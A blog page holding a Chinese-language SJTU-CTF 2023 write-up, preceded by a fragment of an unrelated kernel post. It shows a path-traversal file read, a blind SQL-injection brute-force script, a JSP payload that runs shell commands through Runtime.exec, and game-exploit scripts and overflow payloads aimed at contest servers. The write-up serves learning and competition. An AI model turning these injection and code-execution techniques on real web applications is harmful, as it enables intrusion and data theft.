class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>wait_event在include&#x2F;linux&#x2F;wait.h</p>
<p>___wait_event</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/ctf/SJTU-CTF%202023%20Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/ctf/SJTU-CTF%202023%20Writeup/" class="post-title-link" itemprop="url">SJTU-CTF 2023 Writeup</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-22 20:48:28 / Modified: 20:49:52" itemprop="dateCreated datePublished" datetime="2024-01-22T20:48:28+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>39k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>2:23</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SJTU-CTF-2023-Writeup"><a href="#SJTU-CTF-2023-Writeup" class="headerlink" title="SJTU-CTF 2023 Writeup"></a>SJTU-CTF 2023 Writeup</h1><p>[TOC]</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="flag-gallery"><a href="#flag-gallery" class="headerlink" title="flag gallery"></a>flag gallery</h3><p>F12看网络 可以看到请求了getflag.php?flag&#x3D;<br>尝试改参数，发现可以读其他文件 并且没有限制路径，但是根目录的flag没有权限<br><a target="_blank" rel="noopener" href="http://cf5cd62114f3488cb4558289c91f89fd.penguin.0ops.sjtu.cn:8080/getflag.php?flag=../../../../var/www/html/login.php">http://cf5cd62114f3488cb4558289c91f89fd.penguin.0ops.sjtu.cn:8080/getflag.php?flag=../../../../var/www/html/login.php</a><br>可以看到给了密码的md5哈希 最早以为这个没法碰撞，想别的思路了 比如提权 后来发现可以直接用<a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a> 找到密码是sjtuctf</p>
<h3 id="Mimic-SQL"><a href="#Mimic-SQL" class="headerlink" title="Mimic SQL"></a>Mimic SQL</h3><p><code>select * from article where id=(select id from flag where flag like &#39;0%&#39;)</code> 可以根据查询到结果与否逐个爆破flag的每个字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">t</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0ops&#123;65BDC40EC5FF286E2E0B3C71BF3247D8&#125;</span></span><br><span class="line">base = <span class="string">&quot;http://8d5affacfc024519894c9d2345f17bdf.penguin.0ops.sjtu.cn:8080/article?id=&quot;</span></span><br><span class="line"></span><br><span class="line">flag_c = <span class="string">&#x27;0ops&#123;&#x27;</span></span><br><span class="line">real_flag = flag_c</span><br><span class="line">flag = flag_c</span><br><span class="line">find = <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> find:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(c) <span class="keyword">in</span> <span class="string">&#x27;_%&#x27;</span>:</span><br><span class="line">            flag = flag_c + <span class="string">f&quot;[<span class="subst">&#123;<span class="built_in">chr</span>(c)&#125;</span>]&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag = flag_c + <span class="built_in">chr</span>(c)</span><br><span class="line">        </span><br><span class="line">        query = <span class="string">f&quot;(select id from flag where flag like &#x27;<span class="subst">&#123;flag&#125;</span>%&#x27;)&quot;</span></span><br><span class="line">        <span class="comment">#print(query)</span></span><br><span class="line">        res = requests.get(base+urllib.parse.quote(query))</span><br><span class="line">        <span class="keyword">if</span> check(res.text):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(c)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                find = <span class="literal">True</span></span><br><span class="line">            flag_c = flag</span><br><span class="line">            real_flag = flag_c + <span class="built_in">chr</span>(c)</span><br><span class="line">            <span class="built_in">print</span>(flag_c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(real_flag.lower())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="ezjsp"><a href="#ezjsp" class="headerlink" title="ezjsp"></a>ezjsp</h3><p>刚开始以为嵌入代码的标签都被过滤了 只能用el表达式 参考了这篇文章<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43147039/article/details/116885802">一次jsp上传绕过的思考 –yzddMr6_yzddMr6的博客-CSDN博客</a><br>尝试用[‘’]绕过. 用反射代替new等<br>后来偶然发现竟然可以直接用&lt;%%&gt;注入java代码 不会被过滤 .也不会</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    out.println(Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;/readflag &gt; /usr/local/tomcat/webapps/ROOT/upload/flag.txt&quot;</span>&#125;).waitFor());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/227181.htm#_lab2_1_2">调用java.lang.Runtime.exec的正确姿势分享_java_脚本之家 (jb51.net)</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/dingding_ting/article/details/121215718">Process.waitFor()方法的返回值_永远不要矫情的博客-CSDN博客</a><br>返回0表示执行成功，然后用url读返回的地址即可拿到flag</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="简单的RPG1"><a href="#简单的RPG1" class="headerlink" title="简单的RPG1"></a>简单的RPG1</h3><p>简单模拟 异或可以反推</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">stage1key=[<span class="number">157</span>, <span class="number">212</span>, <span class="number">213</span>, <span class="number">134</span>, <span class="number">249</span>, <span class="number">234</span>, <span class="number">171</span>, <span class="number">226</span>, <span class="number">140</span>, <span class="number">204</span>, <span class="number">135</span>, <span class="number">167</span>, <span class="number">241</span>, <span class="number">168</span>, <span class="number">188</span>, <span class="number">26</span>, <span class="number">77</span>, <span class="number">92</span>, <span class="number">63</span>, <span class="number">118</span>, <span class="number">118</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">10</span>, <span class="number">60</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">status = <span class="number">0</span></span><br><span class="line">choice = []</span><br><span class="line"><span class="keyword">while</span> status &lt; <span class="built_in">len</span>(stage1key):</span><br><span class="line">    choice.append((status*<span class="number">9</span>)^<span class="number">0x86</span>^stage1key[status])</span><br><span class="line">    status += <span class="number">1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">status = 0</span></span><br><span class="line"><span class="string">while status &lt; len(stage1key):</span></span><br><span class="line"><span class="string">    print(choice[status]^(status*9)^0x86,stage1key[status])</span></span><br><span class="line"><span class="string">    status += 1</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for c in choice:</span></span><br><span class="line"><span class="string">    print(chr(c))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> data.find(<span class="string">&#x27;0ops&#x27;</span>)!=-<span class="number">1</span>:</span><br><span class="line">        flag = data[data.find(<span class="string">&#x27;0ops&#x27;</span>):]</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line"></span><br><span class="line">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"></span><br><span class="line">n = <span class="number">102400</span></span><br><span class="line">ssh.connect(<span class="string">&#x27;111.186.57.85&#x27;</span>,<span class="number">40150</span>,<span class="string">&#x27;guest&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">s = ssh.invoke_shell(width=<span class="number">181</span>,height=<span class="number">58</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">begin</span>():</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    b()</span><br><span class="line">    <span class="comment">#print(dir(s))</span></span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        s.send(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        b()</span><br><span class="line">        <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(&#x27;menu&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stage1</span>():</span><br><span class="line">    s.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;play stage 1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> choice:</span><br><span class="line">        s.send(c.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag1 = data[data.find(<span class="string">&#x27;0ops&#x27;</span>):]</span><br><span class="line">    <span class="built_in">print</span>(flag1)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#begin()</span></span><br><span class="line"><span class="comment">#stage1()</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./direction.txt&#x27;</span>)</span><br><span class="line">direction = f.read().split(<span class="string">&#x27;,&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">direction = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> direction]</span><br><span class="line"><span class="built_in">print</span>(direction)</span><br><span class="line"><span class="comment">#print(direction)</span></span><br><span class="line"><span class="comment">#direction = [0 for i in range(10)]</span></span><br><span class="line"><span class="comment">#f = open(&#x27;direction.pkl&#x27;,&#x27;rb&#x27;)</span></span><br><span class="line"><span class="comment">#direction = pickle.load(f)</span></span><br><span class="line"><span class="comment">#print(direction)</span></span><br><span class="line">n2d = &#123;<span class="number">0</span>:<span class="string">&#x27;w&#x27;</span>,<span class="number">1</span>:<span class="string">&#x27;a&#x27;</span>,<span class="number">2</span>:<span class="string">&#x27;s&#x27;</span>,<span class="number">3</span>:<span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isCorrect</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data.find(<span class="string">&#x27;路口&#x27;</span>)!=-<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stage2</span>():</span><br><span class="line">    </span><br><span class="line">    s.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">    b()</span><br><span class="line">    <span class="comment">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(&#x27;play stage 2&#x27;)</span></span><br><span class="line">    s.send(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    b()</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">    b()</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">    b()</span><br><span class="line"></span><br><span class="line">    fail = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    level = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> level &lt; <span class="number">10</span> <span class="keyword">and</span> fail &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="comment">#print(f&#x27;&#123;fail=&#125;&#x27;)</span></span><br><span class="line">        <span class="comment">#print(f&#x27;&#123;level=&#125;,direction=&#123;n2d[direction[level]]&#125;&#x27;)</span></span><br><span class="line">        s.send(n2d[direction[level]])</span><br><span class="line">        b()</span><br><span class="line"></span><br><span class="line">        data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        b()</span><br><span class="line">        <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(isCorrect(data))</span></span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(isCorrect(data)):</span><br><span class="line">            <span class="comment">#print(f&#x27;d[&#123;level&#125;]=&#123;n2d[direction[level]]&#125;&#x27;)</span></span><br><span class="line">            level+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fail+=<span class="number">1</span></span><br><span class="line">            <span class="comment">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            s.send(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            b()</span><br><span class="line">            s.recv(n)</span><br><span class="line">            <span class="comment">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">            b()</span><br><span class="line">            <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">            direction[level] = (direction[level]+<span class="number">1</span>)%<span class="number">4</span></span><br><span class="line">    <span class="built_in">print</span>(level)</span><br><span class="line">    <span class="keyword">return</span> fail &lt; <span class="number">3</span></span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">begin()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> stage2():</span><br><span class="line">    <span class="comment">#ssh = paramiko.SSHClient()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span></span><br><span class="line">    ssh.close()</span><br><span class="line">    ssh.connect(<span class="string">&#x27;111.186.57.85&#x27;</span>,<span class="number">40150</span>,<span class="string">&#x27;guest&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    s = ssh.invoke_shell(width=<span class="number">181</span>,height=<span class="number">58</span>)</span><br><span class="line">    begin()</span><br><span class="line">data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">getFlag(data)</span><br><span class="line">data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">getFlag(data)</span><br><span class="line">data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">getFlag(data)</span><br><span class="line">ssh.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="简单的RPG2"><a href="#简单的RPG2" class="headerlink" title="简单的RPG2"></a>简单的RPG2</h3><p>溢出 cost会变小</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> num = (<span class="number">1</span>&lt;&lt;<span class="number">16</span>)/<span class="number">50</span> ;num&lt;=<span class="number">99999999</span>;num++)&#123;</span><br><span class="line">		<span class="type">int</span> cost = num*<span class="number">50</span>;</span><br><span class="line">		<span class="keyword">if</span>(cost &gt; <span class="number">0</span> &amp;&amp; cost &lt; <span class="number">10000</span>)&#123;</span><br><span class="line">			std::cout&lt;&lt;num&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;cost&lt;&lt;std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">				</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="简单的RPG3"><a href="#简单的RPG3" class="headerlink" title="简单的RPG3"></a>简单的RPG3</h3><p>随机种子是time&#x2F;10 10s重置一次 且是stage3函数开始的时候，所以只要用另一台时区一致的机器跑一样的代码即可</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> tab[<span class="number">4</span>]=&#123;<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;D&#x27;</span>&#125;;</span><br><span class="line">        <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>)/<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">10</span> ;i++)&#123;</span><br><span class="line">                std::cout&lt;&lt;tab[<span class="built_in">rand</span>()%<span class="number">4</span>]&lt;&lt;<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="简单的RPG4"><a href="#简单的RPG4" class="headerlink" title="简单的RPG4"></a>简单的RPG4</h3><p>ida 逆向</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%48s&quot;</span>,s1);</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">memcmp</span>(s1,<span class="string">&quot;your_deck/&quot;</span>,<span class="number">0xA</span>uLL));</span><br><span class="line"><span class="keyword">for</span>(dest = s1; <span class="built_in">strcpy</span>(dest,dest+<span class="number">1</span>))&#123;</span><br><span class="line">    dest = <span class="built_in">strstr</span>(dest,<span class="string">&quot;../&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!dest)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只能用your_deck 且过滤了..&#x2F;<br>但实际上每次过滤之后dest会直接移动一个位置，因此<code>.../</code>会被替换为<code>../</code> 然后找一个攻击力更高的就行了 （前两个byte）</p>
<h3 id="简单的RPG5"><a href="#简单的RPG5" class="headerlink" title="简单的RPG5"></a>简单的RPG5</h3><p>一个表面上走不通的迷宫<br>两个迷惑的地方</p>
<ol>
<li>为什么输入和迷宫数据用的是同一个地址？</li>
<li>为什么迷宫信息需要用那么复杂的方式？</li>
</ol>
<p>分别对应的利用点：</p>
<ol>
<li>scanf %s 最后会补\0 导致覆盖1个byte的数据</li>
<li>表面上是用一个bit存数据 节省空间 实际上覆盖1个byte的数据足以改变8个迷宫格子 打造一条通路</li>
</ol>
<p>exp:<code>wddddddsddddddddssddddwwddssssaassssddssddwwddwwaawwddddwwddwwddddddddssssssddssssaassssddssssssaaaaaaaaaaaaaassssssssssaaaaaassssssssddssssaassssddssddddddddddddddwwddddddddssddddddwwddddddssddddddddwwwwddddssddssddddwwwwwwwwddddssddssssssddddwwddddddddddddddssdd00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></p>
<h3 id="简单的RPG6"><a href="#简单的RPG6" class="headerlink" title="简单的RPG6"></a>简单的RPG6</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> v12[<span class="number">128</span>];<span class="comment">//[rsp+70h]</span></span><br><span class="line"><span class="type">unsigned</span> int8 v13;<span class="comment">//[rsp+F0h]</span></span><br><span class="line"><span class="type">char</span> v14;<span class="comment">//[rsp+F1h]</span></span><br></pre></td></tr></table></figure>
<p>v12[128] &#x3D;&#x3D; v13<br>v12[129] &#x3D;&#x3D; v14<br>目标是让v13变成129 这样直接拿v14的值比 和随机数无关<br><code>[&gt;&gt;&lt;+]</code>靠[]让v13循环加到127，然后v12[v13]加到溢出到0停止循环<br><code>&gt;+</code>v13加到129<br><code>.</code>让v5是1<br>payload：<code>+[&gt;&gt;&lt;+]&gt;+.</code></p>
